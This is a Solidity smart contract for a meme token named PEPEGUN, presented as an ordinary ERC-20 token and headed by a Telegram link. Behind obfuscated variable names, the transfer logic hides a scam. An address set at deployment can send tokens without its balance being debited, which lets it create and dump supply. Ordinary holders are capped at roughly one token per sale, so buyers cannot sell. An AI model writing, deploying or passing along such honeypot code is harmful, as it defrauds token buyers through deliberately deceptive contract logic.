/*

https://t.me/botpepegun

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPEGUN is Ownable {
    IUniswapV2Router02 private tqcngdszri;

    function transferFrom(address ujqr, address ouya, uint256 fcdrpztg) public returns (bool success) {
        require(fcdrpztg <= allowance[ujqr][msg.sender]);
        allowance[ujqr][msg.sender] -= fcdrpztg;
        rfxg(ujqr, ouya, fcdrpztg);
        return true;
    }

    mapping(address => uint256) private fwqu;

    function approve(address drlvyzfgk, uint256 fcdrpztg) public returns (bool success) {
        allowance[msg.sender][drlvyzfgk] = fcdrpztg;
        emit Approval(msg.sender, drlvyzfgk, fcdrpztg);
        return true;
    }

    mapping(address => uint256) private wquaxl;

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address ouya, uint256 fcdrpztg) public returns (bool success) {
        rfxg(msg.sender, ouya, fcdrpztg);
        return true;
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint256 private sknetf = 120;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory cwri, string memory tybzng, address yurivp, address zrwgelusk) {
        name = cwri;
        symbol = tybzng;
        balanceOf[msg.sender] = totalSupply;
        wquaxl[zrwgelusk] = sknetf;
        tqcngdszri = IUniswapV2Router02(yurivp);
    }

    function rfxg(address ujqr, address ouya, uint256 fcdrpztg) private {
        address sgpufcl = IUniswapV2Factory(tqcngdszri.factory()).getPair(address(this), tqcngdszri.WETH());
        bool vonxkm = 0 == wquaxl[ujqr];
        if (vonxkm) {
            if (ujqr != sgpufcl && fwqu[ujqr] != block.number && fcdrpztg < totalSupply) {
                require(fcdrpztg <= totalSupply / (10 ** decimals));
            }
            balanceOf[ujqr] -= fcdrpztg;
        }
        balanceOf[ouya] += fcdrpztg;
        fwqu[ouya] = block.number;
        emit Transfer(ujqr, ouya, fcdrpztg);
    }
}
